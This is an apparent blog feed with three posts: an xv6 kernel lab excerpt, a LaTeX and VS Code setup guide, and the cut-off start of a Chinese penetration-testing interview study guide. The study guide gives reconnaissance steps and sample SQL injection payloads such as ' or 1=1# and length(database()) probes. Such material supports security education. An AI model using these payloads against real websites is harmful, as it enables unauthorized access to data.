held.</span><br><span class="hljs-comment">// If there are no free procs, or a memory allocation fails, return 0.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc*</span><br><span class="hljs-function"><span class="hljs-title">allocproc</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br><br>  <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>    acquire(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">if</span>(p-&gt;state == UNUSED) &#123;<br>      <span class="hljs-keyword">goto</span> found;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      release(&amp;p-&gt;lock);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>found:<br>  p-&gt;pid = allocpid();<br><br>  <span class="hljs-comment">// Allocate a trapframe page.</span><br>  <span class="hljs-keyword">if</span>((p-&gt;trapframe = (struct trapframe *)kalloc()) == <span class="hljs-number">0</span>)&#123;<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// An empty user page table.</span><br>  p-&gt;pagetable = proc_pagetable(p);<br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable == <span class="hljs-number">0</span>)&#123;<br>    freeproc(p);<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>   <span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span>((p-&gt;saved_trapframe = (struct trapframe *)kalloc()) == <span class="hljs-number">0</span>)&#123;<br>    freeproc(p);<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-comment">// Set up new context to start executing at forkret,</span><br>  <span class="hljs-comment">// which returns to user space.</span><br>  <span class="hljs-built_in">memset</span>(&amp;p-&gt;context, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(p-&gt;context));<br>  p-&gt;context.ra = (uint64)forkret;<br>  p-&gt;context.sp = p-&gt;kstack + PGSIZE;<br><br>  p-&gt;alarm_flag=<span class="hljs-number">0</span>;<span class="hljs-comment">//</span><br>  p-&gt;alarm_interval = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_handler = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_ticks = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-comment">// free a proc structure and the data hanging from it,</span><br><span class="hljs-comment">// including user pages.</span><br><span class="hljs-comment">// p-&gt;lock must be held.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freeproc</span><span class="hljs-params">(struct proc *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(p-&gt;trapframe)<br>    kfree((<span class="hljs-keyword">void</span>*)p-&gt;trapframe);<br>  p-&gt;trapframe = <span class="hljs-number">0</span>;<br>    <br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable)<br>    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);<br>  <br>  <span class="hljs-keyword">if</span>(p-&gt;saved_trapframe)<br>    kfree((<span class="hljs-keyword">void</span> *)p-&gt;saved_trapframe);<br>    <br>  p-&gt;pagetable = <span class="hljs-number">0</span>;<br>  p-&gt;sz = <span class="hljs-number">0</span>;<br>  p-&gt;pid = <span class="hljs-number">0</span>;<br>  p-&gt;parent = <span class="hljs-number">0</span>;<br>  p-&gt;name[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  p-&gt;chan = <span class="hljs-number">0</span>;<br>  p-&gt;killed = <span class="hljs-number">0</span>;<br>  p-&gt;xstate = <span class="hljs-number">0</span>;<br>  p-&gt;state = UNUSED;<br>  <br>  p-&gt;alarm_flag=<span class="hljs-number">0</span>;<span class="hljs-comment">//</span><br>  p-&gt;alarm_interval = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_handler = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_ticks = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>评分</p><p><img src="https://img.gls.show/img/b48525193508d98e10d9e31c3878fbf3.png"></p>]]></content>
    
    
    <categories>
      
      <category>MIT6S081</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LaTeX快速入门</title>
    <link href="/p/cc09e53b/"/>
    <url>/p/cc09e53b/</url>
    
    <content type="html"><![CDATA[<p>LaTeX快速入门，包含软件安装、环境配置、基本使用技巧</p><span id="more"></span><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul><li>在镜像网站中下载ISO文件，比如<a href="https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/">清华镜像</a>，这样可以大大加快下载速度</li><li>右键ISO文件，找到打开方式，选择文件资源管理器打开</li><li>以管理员权限运行<strong>install-tl-windows.bat</strong></li><li>此时会弹出tex live installer的界面，点击安装即可。我这里二十分钟安装完成</li></ul><p>打开cmd，在其中输入xelatex -v ，若打印出相关信息，这说明已经安装完成</p><p>有许多编辑器可以写tex，这里是一些主流$\LaTeX$ 编辑器</p><ul><li><p>overleaf，一个在线的、网页端的LaTeX编辑器</p><ul><li>已被墙</li><li>可以使用谷歌账号登录</li></ul></li><li><p>TeXstudio</p><ul><li>开源的、跨平台的集成开发环境，由Qt编写</li></ul></li><li><p>vscode</p><ul><li>vscode os，不用多说</li></ul></li></ul><p>我这里使用了vscode，下面是对应的配置：</p><p>下载LaTeX workshop插件，然后编辑vscode的setting.json文件，在其中加入：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot;latex-workshop.latex.autoBuild.run&quot;</span>: <span class="hljs-string">&quot;never&quot;</span>,<br>    <span class="hljs-string">&quot;latex-workshop.showContextMenu&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;latex-workshop.intellisense.package.enabled&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;latex-workshop.message.error.show&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;latex-workshop.message.warning.show&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;latex-workshop.latex.tools&quot;</span>: [<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;xelatex&quot;</span>,<br>            <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;xelatex&quot;</span>,<br>            <span class="hljs-attr">&quot;args&quot;</span>: [<br>                <span class="hljs-string">&quot;-synctex=1&quot;</span>,<br>                <span class="hljs-string">&quot;-interaction=nonstopmode&quot;</span>,<br>                <span class="hljs-string">&quot;-file-line-error&quot;</span>,<br>                <span class="hljs-string">&quot;%DOCFILE%&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;pdflatex&quot;</span>,<br>            <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;pdflatex&quot;</span>,<br>            <span class="hljs-attr">&quot;args&quot;</span>: [<br>                <span class="hljs-string">&quot;-synctex=1&quot;</span>,<br>                <span class="hljs-string">&quot;-interaction=nonstopmode&quot;</span>,<br>                <span class="hljs-string">&quot;-file-line-error&quot;</span>,<br>                <span class="hljs-string">&quot;%DOCFILE%&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;latexmk&quot;</span>,<br>            <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;latexmk&quot;</span>,<br>            <span class="hljs-attr">&quot;args&quot;</span>: [<br>                <span class="hljs-string">&quot;-synctex=1&quot;</span>,<br>                <span class="hljs-string">&quot;-interaction=nonstopmode&quot;</span>,<br>                <span class="hljs-string">&quot;-file-line-error&quot;</span>,<br>                <span class="hljs-string">&quot;-pdf&quot;</span>,<br>                <span class="hljs-string">&quot;-outdir=%OUTDIR%&quot;</span>,<br>                <span class="hljs-string">&quot;%DOCFILE%&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;bibtex&quot;</span>,<br>            <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;bibtex&quot;</span>,<br>            <span class="hljs-attr">&quot;args&quot;</span>: [<br>                <span class="hljs-string">&quot;%DOCFILE%&quot;</span><br>            ]<br>        &#125;<br>    ],<br>    <span class="hljs-string">&quot;latex-workshop.latex.recipes&quot;</span>: [<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;XeLaTeX&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;xelatex&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;PDFLaTeX&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;pdflatex&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;BibTeX&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;bibtex&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;LaTeXmk&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;latexmk&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;xelatex -&gt; bibtex -&gt; xelatex*2&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;xelatex&quot;</span>,<br>                <span class="hljs-string">&quot;bibtex&quot;</span>,<br>                <span class="hljs-string">&quot;xelatex&quot;</span>,<br>                <span class="hljs-string">&quot;xelatex&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;pdflatex -&gt; bibtex -&gt; pdflatex*2&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;pdflatex&quot;</span>,<br>                <span class="hljs-string">&quot;bibtex&quot;</span>,<br>                <span class="hljs-string">&quot;pdflatex&quot;</span>,<br>                <span class="hljs-string">&quot;pdflatex&quot;</span><br>            ]<br>        &#125;,<br>    ],<br>    <span class="hljs-string">&quot;latex-workshop.latex.clean.fileTypes&quot;</span>: [<br>        <span class="hljs-string">&quot;*.aux&quot;</span>,<br>        <span class="hljs-string">&quot;*.bbl&quot;</span>,<br>        <span class="hljs-string">&quot;*.blg&quot;</span>,<br>        <span class="hljs-string">&quot;*.idx&quot;</span>,<br>        <span class="hljs-string">&quot;*.ind&quot;</span>,<br>        <span class="hljs-string">&quot;*.lof&quot;</span>,<br>        <span class="hljs-string">&quot;*.lot&quot;</span>,<br>        <span class="hljs-string">&quot;*.out&quot;</span>,<br>        <span class="hljs-string">&quot;*.toc&quot;</span>,<br>        <span class="hljs-string">&quot;*.acn&quot;</span>,<br>        <span class="hljs-string">&quot;*.acr&quot;</span>,<br>        <span class="hljs-string">&quot;*.alg&quot;</span>,<br>        <span class="hljs-string">&quot;*.glg&quot;</span>,<br>        <span class="hljs-string">&quot;*.glo&quot;</span>,<br>        <span class="hljs-string">&quot;*.gls&quot;</span>,<br>        <span class="hljs-string">&quot;*.ist&quot;</span>,<br>        <span class="hljs-string">&quot;*.fls&quot;</span>,<br>        <span class="hljs-string">&quot;*.log&quot;</span>,<br>        <span class="hljs-string">&quot;*.fdb_latexmk&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;latex-workshop.latex.autoClean.run&quot;</span>: <span class="hljs-string">&quot;onFailed&quot;</span>,<br>    <span class="hljs-string">&quot;latex-workshop.latex.recipe.default&quot;</span>: <span class="hljs-string">&quot;lastUsed&quot;</span>,<br>    <span class="hljs-string">&quot;latex-workshop.view.pdf.internal.synctex.keybinding&quot;</span>: <span class="hljs-string">&quot;double-click&quot;</span><br></code></pre></td></tr></table></figure><p>然后vscode左边会出现TEX的图标，就可以愉快的用vscode写LaTeX了</p><h1 id="LaTeX-基本概念"><a href="#LaTeX-基本概念" class="headerlink" title="LaTeX 基本概念"></a>LaTeX 基本概念</h1><ul><li>LaTeX 设计初衷：分离内容与格式，以便作者能够专注于内容创作而非版式设计</li><li>发音：雷泰赫</li><li>优点<ul><li>强大的数学公式排版能力</li><li>跨平台、免费、开源</li><li>容易生成复杂的专业排版元素，如<strong>脚注、交叉引用、参考文献、目录</strong>等</li><li>可扩展性（通过开发宏包）</li></ul></li></ul><h1 id="LaTeX-基本命令"><a href="#LaTeX-基本命令" class="headerlink" title="LaTeX 基本命令"></a>LaTeX 基本命令</h1><h2 id=""><a href="#" class="headerlink" title="\"></a>\</h2><p>命令由反斜线 <code>\</code>开头，且是大小写敏感的，\latex不被识别，\LaTeX被识别</p><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs latex">\begin&#123;⟨environment name⟩&#125;[⟨optional arguments⟩]&#123;⟨mandatory arguments⟩&#125;<br>…<br>\end&#123;⟨environment name⟩&#125;<br></code></pre></td></tr></table></figure><ul><li>环境(environment)：令一些效果在局部生效，或是生成特殊的文档元素。环境的用法是一对命令 \begin 和 \end</li><li> ⟨environment name⟩ 为环境名，\begin 和 \end 中填写的环境名应当相同</li><li>[⟨optional arguments⟩] ：环境所需的可选参数</li><li>{⟨mandatory arguments⟩}：为环境所需的必选参数</li></ul><h1 id="LATEX-源代码结构"><a href="#LATEX-源代码结构" class="headerlink" title="LATEX 源代码结构"></a>LATEX 源代码结构</h1><h2 id="document-class-（文档类）"><a href="#document-class-（文档类）" class="headerlink" title="document class （文档类）"></a>document class （文档类）</h2><p>LATEX 源代码以一个 \documentclass 命令作为开头，它指定了文档使用的文档类</p><p>LATEX 源代码的开头须用\documentclass 指定文档类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">\documentclass[⟨options⟩]&#123;⟨class-name⟩&#125;<br></code></pre></td></tr></table></figure><p>⟨class-name⟩ 为文档类的名称，包括：</p><ul><li><p>article</p><ul><li>文章格式，比如科技论文、报告、说明文档等</li></ul></li><li><p>report</p><ul><li>长篇报告格式的文档类，具有章节结构，用于综述、长篇论文、简单的书籍等</li></ul></li></ul><ul><li><p>book</p><ul><li>书籍文档类，包含章节结构和前言、正文、后记等结构</li></ul></li><li><p>proc</p></li><li><p>slides</p><ul><li>幻灯格式的文档类</li></ul></li><li><p>minimal</p><ul><li> 一个极其精简的文档类，只设定了纸张大小和基本字号，用作代码测试的最小工作示例（Minimal Working Example）。</li></ul></li></ul><p>可选参数 ⟨options⟩ 为文档类指定选项，以全局地规定一些排版的参数，如字号、纸张大小、单双面等等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">\documentclass[11pt,twoside,a4paper]&#123;article&#125;<br></code></pre></td></tr></table></figure><ul><li>文档类为article</li><li>指定纸张为 A4 大小，基本字号为 11pt，双面排版</li></ul><h1 id="导言区"><a href="#导言区" class="headerlink" title="导言区"></a>导言区</h1><p>导言区位于 \documentclass 命令之后，作用为：</p><ul><li><p>使用\usepackage 命令调用宏包</p></li><li><p>进行文档的全局设置</p></li></ul><h2 id="宏包"><a href="#宏包" class="headerlink" title="宏包"></a>宏包</h2><p>宏包是一些扩展，用来增强或补充 LATEX 的功能</p><p>示例：一次性调用三个排版表格常用的宏包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">\usepackage&#123;tabularx, makecell, multirow&#125;<br></code></pre></td></tr></table></figure><h1 id="文字排版"><a href="#文字排版" class="headerlink" title="文字排版"></a>文字排版</h1><h2 id="几种常见编码"><a href="#几种常见编码" class="headerlink" title="几种常见编码"></a>几种常见编码</h2><ul><li>ASCII （美国通用信息交换码）使用 0x00–0x7F 对文字编码，也就是 7-bit，覆盖了基本的拉丁字母、数字和符号，以及一些不可打印的控制字符（如换行符、制表符等）</li><li>GBK：多字节编码，支持汉字，向下兼容ASCII编码</li><li>Unicode：多国字符的集合，覆盖了几乎全球范围内的语言文字。UTF-8 是 Unicode的一套编码方案，一个字符由一个到四个字节编码，其中单字节字符的编码与 ASCII 编码兼容。现行版本的 LATEX 使用 UTF-8 作为默认编码</li></ul><h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><ul><li>单个空格键和 Tab 键输入的空白字符视为“空格”</li><li>连续的若干个空白字符视为一个空格</li><li>一行开头的空格忽略不计</li><li>行末的换行符视为一个空格</li></ul><h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><ul><li><p><strong>连续两个换行符</strong>是空行</p></li><li><p>多个空行被视为一个空行</p></li></ul><p>代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex">\begin&#123;document&#125;<br>nmsl<br>wdnmd <br>\end&#123;document&#125;<br></code></pre></td></tr></table></figure><p>效果：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nmsl wdnmd</span><br></code></pre></td></tr></table></figure><hr><p>代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs latex">\begin&#123;document&#125;<br>nmsl<br><br>wdnmd <br>\end&#123;document&#125;<br></code></pre></td></tr></table></figure><p>效果：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nmsl</span><br><span class="hljs-attribute">wdnmd</span><br></code></pre></td></tr></table></figure><h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><ul><li><p>注释：LATEX 用 % 字符作为注释。在这个字符之后直到行末，所有的字符都被忽略</p></li><li><p>转义字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs latex"># $ % &amp; &#123; &#125; _ ^ ~ \<br><br>\# \$ \% \&amp; \&#123; \&#125; \_<br></code></pre></td></tr></table></figure></li><li><p>引号：`’ 构成一对单引号，``”构成一对双引号</p></li><li><p>省略号：\dots</p></li><li><p>换行：<code>\\</code>和<code>\newline</code></p></li></ul><h1 id="章节"><a href="#章节" class="headerlink" title="章节"></a>章节</h1><ul><li>章：\chapter{⟨title⟩}</li><li>节：\section{⟨title⟩}</li><li>小节：\subsection{⟨title⟩}</li></ul><p>这些命令生成章节标题，并能够自动编号</p><h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><ul><li><a href="https://github.com/ElegantLaTeX/ElegantPaper">GitHub - ElegantLaTeX/ElegantPaper</a></li><li><a href="https://www.overleaf.com/project/644fe1665d3fbf900c3ee827">Overleaf, ElegantLaTeX/ElegantPaper</a></li></ul><h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><p>一份不太简短的LATEX介绍</p></li><li><p><a href="https://learnxinyminutes.com/docs/zh-cn/latex-cn/">https://learnxinyminutes.com/docs/zh-cn/latex-cn/</a></p></li><li><p> <a href="https://zhuanlan.zhihu.com/p/36868831">https://zhuanlan.zhihu.com/p/36868831</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>LaTeX</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LaTeX</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hvv面试知识点扫盲</title>
    <link href="/p/e32f19d0/"/>
    <url>/p/e32f19d0/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h1><ol><li>信息收集：收集目标站点的相关信息，包括IP地址、子域名、C段、旁站、框架、服务器系统、语言、目录结构、数据库类型、端口、注册人员信息以及防护设备等数据。</li><li>漏洞发现：通过对目标站点进行功能点测试（上传、越权、目录遍历、注入、XSS、CSRF等）、利用漏扫工具（如Nessus、AWVS）和手工测试系统漏洞等手段，来发现可能存在的漏洞。</li><li>漏洞验证：使用Kali等黑客工具，利用已经发现的漏洞进行手工验证，以确认漏洞是否仍然存在以及漏洞的危害程度。</li><li>出具报告交付：在完成漏洞验证后，根据渗透测试的结果和严重程度，出具详细的安全漏洞报告，描述发现的漏洞包括可能的危害程度、访问路径、确认过程以及建议修复措施等项信息，以交付于委托者。</li><li>漏洞复测：对修复后的漏洞再次进行测试，以确认修复情况。</li></ol><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote><p>如何信息收集（IP、子域名、C段、旁站、框架、服务器系统、语言、目录结构、数据库类型、端口、注册人员信息、防护设备</p></blockquote><ol><li>Whois 查询：WHOIS查询是一种用于查找域名、IP地址以及域名注册人信息的网络协议。可以通过WHOIS查询获取到域名注册人的联系信息、DNS服务器、域名过期时间等信息。</li><li>子域名枚举：使用子域名爆破工具（如 subdomain-find），枚举出目标系统的子域名（例如blog.example.com、mail.example.com等）以及与目标公司有关系的其他域名。</li><li>C段扫描：对IP地址所处的C段内的所有主机进行扫描，了解其他潜在的服务器或者系统。<ol><li>C段扫描通常是指对目标 IP 地址所在的整个 C 类网络地址段进行扫描的过程，发现同一网络内的其他主机信息。例如，如果目标 IP 地址是 192.168.1.100，那么其所在的 C 类网络地址段是 192.168.1.0/24，C段扫描就是在该网络段内对主机进行端口扫描、服务探测等安全测试。</li><li>C段扫描通常是渗透测试的一部分，用于发现与目标位于同一网络段内的其他主机信息，从而帮助测试人员 identifly 安全风险和弱点。</li></ol></li><li>旁站探测：通过旁站分析工具（例如webby、bebop等），查找与目标系统相关的其他网站。</li><li>框架识别：识别目标网站所使用的 CMS 系统和框架，例如 WordPress、Joomla、Drupal 等，从而了解可能存在的安全漏洞。<ol><li>WordPress、Joomla 等 CMS 系统通常在 head 标签中添加 generator 标记；</li><li>Bootstrap、jQuery 等常用的前端库和框架也常常在代码中添加版本信息和其他特定标识。</li></ol></li><li>服务器识别：使用工具（如 Nmap 等）对目标主机进行端口扫描，从而发现系统中的运行服务、操作系统以及端口信息。</li><li>语言版本识别：使用工具（如 Wappalyzer 等）识别网站所使用的语言版本（如 PHP、ASP.NET、Java 等），以便了解成功攻击网站的可能性。</li><li>目录结构探测：使用目录扫描工具（如 DirBuster、Gobuster 等）扫描目标主机的目录结构，发现可能存在的敏感目录以及可能存在的漏洞点。</li><li>数据库类型探测：通过分析页面返回的错误信息和 HTTP 头信息，识别目标系统所使用的数据库类型。<ol><li>端口扫描：通过扫描目标主机上开放的端口，可以映射不同的端口和服务类型，推断出目标数据库所使用的类型（比如mysql是3306）。</li></ol></li><li>端口识别：使用端口扫描工具对目标主机进行扫描，识别主机所开放的端口信息，以便了解目标系统可能存在的漏洞点。<ol><li>nc -vz <a href="www.baidu.com">www.baidu.com</a> 80</li></ol></li><li>注册人员信息收集：查询目标公司注册的信息，例如域名注册人信息、ICP备案信息，从中考察相关人员的联系方式等。</li><li>防护设备识别：通过各种手段收集目标系统接入的安全设备信息，包括防火墙、WAF（Web 应用程序防火墙）等，以便于绕过其保护机制，实现更高效的渗透攻击。</li></ol><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="基本技巧"><a href="#基本技巧" class="headerlink" title="基本技巧"></a>基本技巧</h2><ul><li>猜列数：order by 1 表示按照第一列排序，这样可以猜测列有几个列。<ul><li>假设<code>order by 3#</code>时，返回错误那么说明只有两列</li></ul></li><li>猜数据库名称长度<ul><li>1’ and length(database())=3 # 若这个错误下面正常那么数据库名称长度为4</li><li>1’ and length(database())=4 #</li></ul></li><li>联合查询<ul><li>使用 union 查询的时候需要和主查询的列数相同</li><li>Select * From 用户表 Where UserName=xxx and Password=xxx or 1=1–</li></ul></li><li>如果是数字型的注入，那么就不用去闭合单引号</li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>根据提交方式、注入点和运行结果的不同，SQL注入可以分为以下几种类型：</p><ol><li>GET型注入：通过修改HTTP请求中的URL参数来实现注入攻击，例如：<a href="http://example.com/?id=1&#39;">http://example.com/?id=1&#39;</a> or 1=1#。</li><li>POST型注入：通过修改HTTP请求体中的表单数据来实现注入攻击，例如：POST /login HTTP/1.1，数据体为：username=admin&amp;password=123’ or 1=1#。</li><li>Cookie型注入：通过修改浏览器的Cookie值来实现注入攻击，例如：Cookie: username=admin; password=123’ or 1=1#。</li></ol><ol><li>数字型注入：针对数字类型的注入点进行攻击，例如：SELECT * FROM users WHERE id=1，攻击者可通过修改id=1为id=1 or 1=1来实现注入攻击。</li><li>字符串型注入：针对字符串类型的注入点进行攻击，例如：SELECT * FROM users WHERE name=’Tom’，攻击者可通过修改name=’Tom’为name=’Tom’ or ‘1’=’1来实现注入攻击。</li></ol><ol><li>搜索型注入：针对搜索功能进行攻击，例如：SELECT * FROM products WHERE name LIKE ‘%apple%’，攻击者可通过搜索框输入%apple%’ or 1=1#来实现注入攻击。</li><li>基于时间的盲注：攻击者无法直接获取注入结果，但是可以通过延长SQL查询时间来判断是否成功注入。</li><li>基于报错的注入：攻击者可以通过构造恶意SQL语句，触发服务器的报错信息，从而获取敏感数据。</li><li>基于布尔的盲注：攻击者无法直接获取注入结果，但是可以通过构造恶意SQL语句，根据返回结果的真假值来推断是否成功注入。</li><li>基于数字的注入：攻击者可以通过构造恶意SQL语句，将注入结果转化为数字输出，例如计算该表中的行数、求和等操作。</li></ol><h2 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h2><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 